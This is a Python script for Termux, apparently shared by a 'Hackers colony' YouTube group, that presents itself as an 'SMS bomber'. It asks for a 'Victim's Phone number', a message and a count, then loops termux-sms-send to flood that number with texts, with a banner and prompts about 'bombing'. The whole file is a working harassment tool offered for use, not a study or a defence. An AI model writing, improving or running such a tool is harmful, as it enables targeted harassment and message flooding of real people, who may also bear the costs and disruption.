import subprocess
import os
import re  # Import regex module
import colorama 
import time
from colorama import Fore, Style

W = '\033[1;37m'

colorama.init(autoreset=True)

# Function to create a gradient between two RGB colors
def rgb_gradient(start_color, end_color, steps):
    gradient = []
    for i in range(steps):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / (steps - 1)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / (steps - 1)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / (steps - 1)))
        gradient.append((r, g, b))
    return gradient

# Function to print text with gradient colors
def print_gradient_text(text, start_color, end_color):
    steps = len(text)
    gradient = rgb_gradient(start_color, end_color, steps)
    for i, char in enumerate(text):
        r, g, b = gradient[i]
        print(f'\033[38;2;{r};{g};{b}m{char}', end="")
    print(Style.RESET_ALL)

# Function to center the text in the terminal
def center_text(text):
    rows, columns = os.popen('stty size', 'r').read().split()
    lines = text.split('\n')
    centered_lines = []
    for line in lines:
        centered_line = line.center(int(columns))
        centered_lines.append(centered_line)
    return '\n'.join(centered_lines)

# Function to send SMS (using termux-sms-send for example)
def send_sms(phone_number, message):
    try:
        subprocess.run(['termux-sms-send', '-n', phone_number, message], check=True)
        print(f"{Fore.GREEN}SMS sent successfully!")
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Failed to send SMS: {e}")
    except Exception as e:
        print(f"{Fore.RED}Unexpected error: {e}")

# Function to validate phone number
def validate_phone_number(phone_number):
    pattern = r"^\d+$"  # Ensures only digits are allowed
    if re.match(pattern, phone_number):
        return True
    else:
        print(f"\n{Fore.RED}Invalid phone number. Please enter digits only.")
        return False

# Main function to display colored text and run the bomber
def main():
    os.system('clear')

    # ASCII Art texts to display
    hco = """\n\n\
██╗  ██╗ ██████╗ ██████╗ 
██║  ██║██╔════╝██╔═══██╗
███████║██║     ██║   ██║
██╔══██║██║     ██║   ██║
██║  ██║╚██████╗╚██████╔╝
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
"""
    
    bomber = """\
██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
"""
    ver = f'{Fore.YELLOW}V1.2'

    by_hackers_colony = f"\033[1;94m            \nScript By {Fore.GREEN}AZHAR\n\n"

    # Start and end colors for the gradient (RGB)
    start_color = (255, 0, 0)  # Red
    end_color = (0, 0, 255)    # Blue
    
    # Center the texts and print them with gradient colors
    time.sleep(1.3)
    print_gradient_text(center_text(hco), start_color, end_color)
    time.sleep(0.5)
    print_gradient_text(center_text(bomber), start_color, end_color)
    print(center_text(ver))
    print(center_text(by_hackers_colony))
    

    time.sleep(1)  # Pause for a moment to display the text before running the script

    # Now, proceed with the SMS bomber logic
    try:
       cncode = input(f'\n{Fore.GREEN}[{W}+{Fore.GREEN}]{Fore.MAGENTA} Enter Country Code Without "+" eg.91 {Fore.GREEN}=> ')
       num = input(f"\n{Fore.GREEN}[{W}+{Fore.GREEN}]{Fore.YELLOW} Enter the Victim's Phone number\n\n{Fore.GREEN}=> +{cncode}")
       if not validate_phone_number(num):
           time.sleep(3)
           return main()  # Restart the program if the phone number is invalid

       msg = input(f"\n{Fore.GREEN}[{W}+{Fore.GREEN}]{Fore.CYAN} Enter Your Message: ")
       bomb = int(input(f"\n{Fore.GREEN}[{W}+{Fore.GREEN}]{Fore.BLUE} How Many Times You Want To Send Message {Fore.RED}(60 Messages at a Time): {Fore.GREEN}"))
    
       combnum = f"+{cncode}{num}"
       print()
    
       final_call = input(f'\n{Fore.YELLOW}[?]{Fore.RED} Do You Want To Change NO.{Fore.WHITE}{combnum} {Fore.RED}(Y/N)\n\n{Fore.GREEN}=> ')
       input(f"\n{Fore.YELLOW}[i]{Fore.GREEN} After Sending 30 to 35 SMS You Will See An Prompt like \n{Fore.CYAN}(Termux API: This app is sending large quantity of message) \nDon't click anywhere Your SMS Sending Process Running In \nBackground{Fore.GREEN} [Press Enter After Reading This]{Fore.GREEN} ")
    
       if final_call.lower() == 'y':
          main()
       elif final_call.lower() == 'n':
          os.system('clear')
          print(f"\n\n{Fore.GREEN}[{W}+{Fore.GREEN}]{Fore.MAGENTA} Bombing on No. : {Fore.YELLOW}{combnum}....\n")
          print(f"{Fore.RED}[{W}+{Fore.RED}]\033[1;33m Press {Fore.GREEN}Ctrl + c \033[1;33m, For Stop Bombing.\n")
          time.sleep(2)
          try:
             i = 0
             while i != bomb:
                 send_sms(combnum, msg)
                 i += 1
             print(f"\n{Fore.BLUE}[{W}✓{Fore.BLUE}]{Fore.GREEN} Completed sending {bomb} messages to {combnum}.\n")
             time.sleep(2)
             ask = input(f"{Fore.RED}[{W}?{Fore.RED}]{Fore.BLUE} Back To Menu {Fore.GREEN}[Y{Fore.CYAN}/{Fore.RED}N]{Fore.BLUE} : {Fore.GREEN}").lower()
             if ask == 'y':
                time.sleep(1)
                return main()           
             else:
                print(f"\n{Fore.RED}[{W}*{Fore.RED}]\033[1;334m Don't Forget To Subscribe Our YouTube Channel Hackers colony official")
                time.sleep(1.5)
                channel_url = 'https://youtube.com/@hackers_colony_tech?si=7FEalwT2t0khmivd'
                os.system(f'termux-open {channel_url}')
                time.sleep(2)
                os.system("exit")
              
          except:
             time.sleep(1)
             print(f"\n\n{Fore.RED}[{W}-{Fore.RED}]{Fore.MAGENTA} Bombing Stopped!!\n")
    
    except:
       print(f"\n{Fore.RED}[{W}!{Fore.RED}]{Fore.RED} Program Interpreted")

if __name__ == "__main__":
    main()